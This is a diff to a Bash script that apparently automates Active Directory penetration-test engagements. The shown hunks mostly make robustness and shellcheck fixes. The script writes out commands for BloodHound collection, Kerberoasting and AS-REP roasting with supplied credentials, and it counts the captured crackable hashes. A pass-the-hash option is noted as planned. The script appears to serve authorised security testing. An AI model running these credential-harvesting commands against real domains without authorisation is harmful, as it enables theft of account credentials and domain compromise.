@@ -97,12 +97,13 @@ while [ $# -gt 0 ]; do
         *) echo "[WARN] Argumento desconocido: $1"; shift ;;
     esac
 done
+export AD_HASH  # reserved for pass-the-hash support (planned)
 
 # ---------------------------------------------------------------------------
 # Inicialización del engagement
 # ---------------------------------------------------------------------------
 
-ENGAGEMENT_DIR=$(ls -d "$OFFSEC_HOME/findings/"????-??-??_${ENGAGEMENT_NAME}* 2>/dev/null | head -1 || true)
+ENGAGEMENT_DIR=$(find "$OFFSEC_HOME/findings" -maxdepth 1 -type d -name "????-??-??_${ENGAGEMENT_NAME}*" 2>/dev/null | sort | head -1)
 if [ -z "$ENGAGEMENT_DIR" ]; then
     echo "[ERROR] Engagement no encontrado: $ENGAGEMENT_NAME"
     echo "  Ejecutar primero: /new-engagement $ENGAGEMENT_NAME"
@@ -258,9 +259,9 @@ if [ "$DO_BLOODHOUND" = true ]; then
         BH_CMD="bloodhound-python -u '$AD_USER' -p '$AD_PASS' -d '$AD_DOMAIN' -dc $DC_IP -c All --zip -o $BH_DIR"
         log "START" "BloodHound collection — dominio $DOM_TOKEN"
         if eval "$BH_CMD" > "$BH_DIR/bh_run.log" 2>&1; then
-            BH_ZIP=$(ls "$BH_DIR"/*.zip 2>/dev/null | head -1)
+            BH_ZIP=$(find "$BH_DIR" -maxdepth 1 -name "*.zip" 2>/dev/null | head -1)
             if [ -n "$BH_ZIP" ]; then
-                log "FIND" "BloodHound ZIP generado: $(basename $BH_ZIP)"
+                log "FIND" "BloodHound ZIP generado: $(basename "$BH_ZIP")"
                 log "THINK" "Importar ZIP en BloodHound GUI para visualizar attack paths"
                 log "THINK" "Queries utiles: Shortest path to DA, Kerberoastable users, ACL abuse"
             fi
@@ -286,6 +287,7 @@ if [ "$DO_KERBEROAST" = true ]; then
     if command -v GetUserSPNs.py &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$AD_DOMAIN" ]; then
         run_cmd "GetUserSPNs.py '${AD_DOMAIN}/${AD_USER}:${AD_PASS}' -dc-ip $DC_IP -request" "$KERB_OUT"
         if [ -f "$KERB_OUT" ]; then
+            # shellcheck disable=SC2016  # literal $ in grep regex, not shell expansion
             HASH_COUNT=$(grep -c '^\$krb5tgs\$' "$KERB_OUT" 2>/dev/null || echo "0")
             if [ "$HASH_COUNT" -gt 0 ]; then
                 log "CRIT" "Kerberoasting — $HASH_COUNT hash(es) TGS capturados"
@@ -326,6 +328,7 @@ if [ "$DO_ASREPROAST" = true ]; then
         fi
 
         if [ -f "$ASREP_OUT" ] && [ -s "$ASREP_OUT" ]; then
+            # shellcheck disable=SC2016  # literal $ in grep regex, not shell expansion
             HASH_COUNT=$(grep -c '^\$krb5asrep\$' "$ASREP_OUT" 2>/dev/null || echo "0")
             if [ "$HASH_COUNT" -gt 0 ]; then
                 log "CRIT" "AS-REP Roasting — $HASH_COUNT cuenta(s) sin preauth"
